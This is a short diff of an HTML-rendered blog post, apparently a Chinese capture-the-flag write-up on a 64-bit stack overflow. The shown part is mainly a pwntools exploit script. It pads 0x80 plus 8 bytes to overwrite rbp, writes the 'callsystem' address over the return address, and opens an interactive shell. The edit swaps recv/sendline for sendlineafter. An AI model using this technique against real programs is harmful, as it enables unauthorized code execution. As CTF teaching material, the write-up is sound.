@@ -57,9 +57,9 @@ elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span>
 callsystem_addr <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">callsystem</span><span style="color:#e6db74">&#39;</span>] 
 <span style="color:#75715e">#symbols函数用于获取获取一个标志的地址，这个标志可以是system函数、bss全局变量等</span>
 payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x80</span> <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(callsystem_addr)
-sh<span style="color:#f92672">.</span>recv()
-sh<span style="color:#f92672">.</span>sendline(payload)
-sh<span style="color:#f92672">.</span>interactive()
+<span style="color:#75715e">#sh.recv()</span>
+sh<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Hello, World</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>,payload)<span style="color:#75715e">#接收到Hello, World之后传入payload</span>
+sh<span style="color:#f92672">.</span>interactive()<span style="color:#75715e">#接收shell</span>
 </code></pre></div><p>注意这里的payload填充0x80后还需要填充8个字节(64位)的数据来覆盖rbp，之后才是覆盖retn</p>
 <p><img src="/images/image-20200115172339397.png" alt="image-20200115172339397"></p>
 
